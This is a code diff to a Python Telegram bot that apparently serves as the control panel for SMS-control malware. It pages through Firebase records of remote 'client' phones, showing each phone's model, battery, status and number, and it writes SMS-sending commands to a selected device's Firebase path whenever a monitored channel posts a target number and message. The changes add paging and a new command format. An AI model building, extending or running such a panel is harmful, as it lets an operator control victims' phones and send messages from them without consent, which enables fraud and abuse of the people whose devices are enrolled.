@@ -1,6 +1,7 @@
 import logging
 import requests
 import asyncio
+import math
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -40,6 +41,9 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text('✅ Firebase Connect Successfully!\n\nNext Step: /setdevice command use karein.')
 
 async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await show_device_page(update, context, 0)
+
+async def show_device_page(update, context, page):
     global firebase_base
     if not firebase_base:
         await update.message.reply_text("❌ Pehle /setfirebase <url> use karo!")
@@ -52,16 +56,31 @@ async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Koi clients nahi mile.")
             return
 
-        keyboard = []
-        msg_lines = ["📱 DEVICES LIST:\n"]
-        for client_id, info in clients.items():
-            name = info.get('modelName', 'Unknown') 
-            battery = info.get('battery', 'N/A')
-            status = "ONLINE" if info.get('status') == True else "OFFLINE"
-            msg_lines.append(f"• {name} | {battery} | {status}")
-            keyboard.append([InlineKeyboardButton(f"View {name}", callback_data=client_id)])
+        items = list(clients.items())
+        total_pages = math.ceil(len(items) / 10)
+        page = max(0, min(page, total_pages - 1))
+        
+        start_idx = page * 10
+        page_items = items[start_idx : start_idx + 10]
 
-        await update.message.reply_text("\n".join(msg_lines), reply_markup=InlineKeyboardMarkup(keyboard))
+        keyboard = []
+        msg = "📱 **DEVICES LIST:**\n\n"
+        for client_id, info in page_items:
+            name = info.get('modelName', 'Unknown')
+            status_icon = "🟢" if info.get('status') == True else "🔴"
+            msg += f"{status_icon} {name}\n"
+            keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])
+
+        nav = []
+        if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"page_{page-1}"))
+        nav.append(InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
+        if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
+        keyboard.append(nav)
+
+        if update.callback_query:
+            await update.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
+        else:
+            await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
     except Exception as e:
         await update.message.reply_text(f"Error: {str(e)}")
 
@@ -69,26 +88,27 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global selected_device_id
     query = update.callback_query
     await query.answer()
-    client_id = query.data
-    selected_device_id = client_id
     
-    try:
-        response = requests.get(f"{firebase_base}/{client_id}.json")
-        details = response.json()
-        if not details:
-            await query.edit_message_text("Details nahi mile.")
-            return
-
-        status = "ONLINE" if details.get('status') == True else "OFFLINE"
-        msg = (f"📱 {details.get('modelName', 'Unknown')}\n"
-               f"🆔 {client_id}\n"
-               f"📞 {details.get('mobNo', 'Unknown')}\n"
-               f"🔋 {details.get('battery', 'N/A')}\n"
-               f"{status}\n\n"
-               f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
-        await query.edit_message_text(text=msg)
-    except Exception as e:
-        await query.edit_message_text(f"Error: {str(e)}")
+    if query.data.startswith("page_"):
+        await show_device_page(update, context, int(query.data.split("_")[1]))
+    elif query.data.startswith("view_"):
+        client_id = query.data.split("_")[1]
+        selected_device_id = client_id
+        try:
+            response = requests.get(f"{firebase_base}/{client_id}.json")
+            details = response.json()
+            status = "ONLINE 🟢" if details.get('status') == True else "OFFLINE 🔴"
+            msg = (f"📱 {details.get('modelName', 'Unknown')}\n"
+                   f"🆔 {client_id}\n"
+                   f"📞 {details.get('mobNo', 'Unknown')}\n"
+                   f"🔋 {details.get('battery', 'N/A')}\n"
+                   f"{status}\n\n"
+                   f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
+            await query.edit_message_text(text=msg)
+        except Exception as e:
+            await query.edit_message_text(f"Error: {str(e)}")
+    elif query.data == "cancel":
+        await query.edit_message_text("❌ Operation Cancelled.")
 
 async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global monitored_channel_id
@@ -146,41 +166,23 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global is_monitoring, selected_device_id
     if is_monitoring and update.channel_post and str(update.channel_post.chat.id) == monitored_channel_id:
         msg_text = update.channel_post.text or ""
-        
         try:
             target_number = ""
             token = ""
-            
             if "To:" in msg_text and "Message:" in msg_text:
                 target_number = msg_text.split("To:")[1].split("\n")[0].strip()
                 token = msg_text.split("Message:")[1].split("\n")[0].strip()
             
             if target_number and token:
-                timestamp = int(asyncio.get_event_loop().time() * 1000)
-                payload = {
-                    "admin_sent": True,
-                    "id": f"cmd_{timestamp}_bot",
-                    "message": token,
-                    "status": "pending",
-                    "targetNumber": target_number,
-                    "timestamp": timestamp
-                }
-                
-                # 'put' ka use kiya hai taaki path overwrite ho jaye aur device ko command mile
-                push_url = f"{firebase_base.replace('/clients', '')}/clients/{selected_device_id}/commands/sendSms.json"
-                
+                payload = {"from": 0, "to": target_number, "message": token, "isSended": False}
+                push_url = f"{firebase_base}/{selected_device_id}/webhookEvent/sendSms.json"
                 response = requests.put(push_url, json=payload)
-                
                 if response.status_code == 200:
-                    await update.effective_chat.send_message(
-                        f"✅ **Sent Successfully!**\n\n"
-                        f"🎯 Number: `{target_number}`\n"
-                        f"💬 Token: `{token}`"
-                    )
+                    await update.effective_chat.send_message(f"✅ SMS Sent to Webhook!\n🎯 To: {target_number}")
                 else:
                     await update.effective_chat.send_message(f"❌ Firebase Error: {response.status_code}")
             else:
-                await update.effective_chat.send_message("❌ Format mismatch, number ya token nahi mila.")
+                await update.effective_chat.send_message("❌ Format mismatch!")
         except Exception as e:
             await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
